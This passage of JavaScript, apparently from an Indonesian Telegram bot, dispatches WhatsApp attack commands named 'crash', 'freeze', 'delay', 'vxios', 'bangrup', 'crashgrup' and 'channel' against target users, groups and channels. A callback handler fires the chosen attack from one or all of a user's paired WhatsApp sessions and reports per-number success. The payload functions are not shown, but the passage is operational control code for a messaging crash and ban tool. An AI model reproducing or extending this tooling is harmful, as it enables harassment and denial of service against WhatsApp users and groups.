                if (!checkOwner(uid)) return botError(ctx, "Khusus owner.");
                await clearAllSessions();
                clearAllPairs();
                await botSucces(ctx, "Semua sesi WhatsApp (semua user) telah dihapus.");
                break;
            }
            
           // ----------------------------- ( TRAVAS: CRASH ) ----------------------------- \\
            case "crash": {
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");
                await travasRun(ctx, uid, args, command, "user", (sock, target) => travas.crash(sock, target));
                break;
            }

            case "UI": {
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");
                await travasRun(ctx, uid, args, command, "user", (sock, target) => travas.UI(sock, target));
                break;
            }
            
            case "freeze": {
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");
                await travasRun(ctx, uid, args, command, "user", (sock, target) => travas.freeze(sock, target));
                break;
            }
            
            case "delay": {
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");
                await travasRun(ctx, uid, args, command, "user", (sock, target) => travas.DelayX2(sock, target));
                break;
            }

            // ----------------------------- ( TRAVAS: IOS ) ----------------------------- \\
            case "vxios": {
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");
                await travasRun(ctx, uid, args, command, "user", (sock, target) => travas.ios(sock, target));
                break;
            }
                        
            // ----------------------------- ( TRAVAS: GRUP ) ----------------------------- \\
            case "bangrup": {
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");
                await travasRun(ctx, uid, args, command, "group", (sock, target) => travas.groupBan1(sock, target));
                break;
            }            

            case "crashgrup": {
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");
                await travasRun(ctx, uid, args, command, "group", (sock, target) => travas.grupCrash(sock, target));
                break;
            }

            // ----------------------------- ( TRAVAS: CHANNEL ) ----------------------------- \\
            case "channel": {
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");   
                await travasRun(ctx, uid, args, command, "channel", (sock, target) => travas.channel(sock, target));
                break;
            }

            // ----------------------------- ( MENU ) ----------------------------- \\
            case "menu": {
                await sendAllMenu(ctx);
                break;
            }

            default: {
                return;
            }
        }
    });

    // ----------------------------- ( CALLBACK QUERY HANDLER ) ----------------------------- \\
    /* Handler untuk tombol inline. */

    bot.on("callback_query:data", async (ctx) => {
        const data = ctx.callbackQuery.data;
        await ctx.answerCallbackQuery();

        switch (true) {
            case data === "recheck_join": {
                const uidCheck = String(ctx.from.id);
                const joined = await isUserJoinedChannel(uidCheck);
                if (joined) {
                    await ctx.editMessageText("✅ Terima kasih sudah join! Sekarang kamu bisa pakai bot.");
                } else {
                    await botError(ctx, "Kamu masih belum join channel-nya.");
                }
                return;
            }

            case data === "all_menu": {
                await ctx.deleteMessage().catch(() => {});
                return sendAllMenu(ctx);
            }

            case data === "travas_menu": {
                await ctx.deleteMessage().catch(() => {});
                return sendTravasMenu(ctx);
            }

            case data === "back_menu": {
                await ctx.deleteMessage().catch(() => {});
                return sendStartMenu(ctx);
            }

            case data.startsWith("action_"): {
                const uid = String(ctx.from.id);
                const pending = pendingAction.get(uid);

                if (!pending) {
                    return botError(ctx, "Sesi sudah kadaluarsa.");
                }

                const picked = data.replace("action_", "");
                const storageKey = pending.storageKey || uid;

                const execute = async (number) => {
                    const client = getClient(storageKey, number);
                    if (!client?.sock || client.status !== "open") {
                        return `${number} — 🔴 Offline`;
                    }
                    try {
                        await pending.func(client.sock, pending.target);
                        return `${number} — 🟢 Berhasil`;
                    } catch {
                        return `${number} — ❌ Gagal`;
                    }
                };

                let results = [];

                if (picked === "all") {
                    for (const number of getPairsForUser(storageKey)) {
                        results.push(await execute(number));
                    }
                } else {
                    results.push(await execute(picked));
                }

                pendingAction.delete(uid);
                await ctx.deleteMessage().catch(() => {});

                if (picked !== "all") {
                    return sendTextResult(ctx, { type: "single", session: picked, target: pending.target });
                }

                return sendTextResult(ctx, { type: "all", results });
            }

            default: {
                return;
            }
        }
    });

    // ----------------------------- ( ERROR HANDLER ) ----------------------------- \\
    /* Menangani error per-instance agar tidak freeze. */
(async () => {
    try {
        bot.catch((err) => {
            const label = isSubBot ? `Sub-bot (${subBotOwnerId})` : "Main bot";
            log.error(`${label} error: ${err.message}`);
        });
    } catch (err) {
        log.error(err);
    }
})();